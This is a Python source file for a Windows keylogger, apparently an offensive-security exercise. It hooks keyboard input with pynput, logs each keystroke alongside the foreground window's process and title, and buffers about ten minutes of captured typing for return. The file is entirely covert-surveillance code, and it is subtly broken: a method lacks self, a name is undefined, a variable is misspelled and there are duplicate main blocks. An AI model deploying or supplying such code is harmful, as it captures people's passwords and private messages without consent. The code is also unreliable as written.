from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
from pynput import keyboard

import os
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class keyLogger:
    def __init__(self):
        self.current_window = None
        
    def get_current_window(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'
    
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid) #// (process information, herit, process ID)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable),512)# // (Process, module, save buffer, buffer size)
        
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e} : window name unknown')
        
        print('\n', process_id, executable.value.decode(), self.current_window)
        
        windll.kernel32.CloseHandle(h_process)
        
    def mykeystroke(key):
        try:
            if 32 <= ord(key.char) <= 126:
                print(key.char, end='')
        except AttributeError:
            if key == keyboard.Key.enter:
                print("[ENTER]")
            elif key == keyboard.Key.space:
                print(" ", end='')
            elif key == keyboard.Key.backspace:
                print("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                print("[TAB]")
            else:
                print(f"[{key.name.upper()}]")

if __name__ == "__main__":
    with keyboard.Listener(on_press=mykeystroke) as listener:
        listener.join()
    
def run():
    import time
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    start = time.time()
    kl = keyLogger()
    listner = keyboard.Listener(on_press=kl.mykeystroke)
    listner.start()
    while time.time() - start < TIMEOUT:
        pass
    log = sys.stdout.getvalue()
    sys.stdout = save_stdoutss
    return log
        
if __name__ == '__main__':
    print(run())
    print('done.')
    
